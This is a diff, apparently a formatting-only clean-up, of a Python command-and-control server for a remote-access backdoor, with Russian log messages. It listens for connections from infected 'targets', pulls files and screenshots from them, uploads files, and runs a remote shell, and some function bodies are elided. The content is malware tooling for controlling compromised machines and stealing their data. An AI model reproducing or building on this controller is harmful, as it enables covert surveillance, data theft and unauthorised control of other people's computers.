@@ -1,23 +1,26 @@
 #!/usr/bin/python
-import socket 
+import socket
 import json
 import base64
 import logging
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
 
+
 def reliable_send(data, target):
-        json_data = json.dumps(data).encode()
-        target.send(json_data)
+    json_data = json.dumps(data).encode()
+    target.send(json_data)
+
 
 def reliable_recv(target):
-        json_data = b""
-        while True:
-                try:
-                        json_data = json_data + target.recv(1024)
-                        return json.loads(json_data.decode())
-                except ValueError:
-                        continue
+    json_data = b""
+    while True:
+        try:
+            json_data = json_data + target.recv(1024)
+            return json.loads(json_data.decode())
+        except ValueError:
+            continue
+
 
 def download_file(command, target):
     file_name = command[9:].strip()
@@ -29,6 +32,7 @@ def download_file(command, target):
     except Exception as e:
         logging.error(f"Ошибка загрузки файла {file_name}: {e}")
 
+
 def upload_file(command, target):
     file_name = command[7:].strip()
     try:
@@ -39,6 +43,7 @@ def upload_file(command, target):
         logging.error(f"Файл {file_name} не найден")
         reliable_send("[!!] Файл не найден", target)
 
+
 def save_screenshot(target, screenshot_id):
     file_name = f"screenshot_{screenshot_id}.png"
     try:
@@ -48,6 +53,7 @@ def save_screenshot(target, screenshot_id):
         logging.info(f"Скриншот сохранен как screenshot_{screenshot_id}.png")
     except Exception as e:
         logging.error(f"Ошибка сохранения скриншота: {e}")
+
 
 # Работа с удаленной оболочкой
 def shell(target, ip):
@@ -75,8 +81,9 @@ def shell(target, ip):
             logging.error(f"Ошибка выполнения команды: {e}")
             break
     target.close()
-    
-#подключение и прослушивание
+
+
+# подключение и прослушивание
 def server():
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -91,6 +98,7 @@ def server():
         logging.info("\n[!] Сервер остановлен вручную")
     except Exception as e:
         logging.error(f"[!!] Критическая ошибка: {e}")
+
 
 if __name__ == "__main__":
     server()
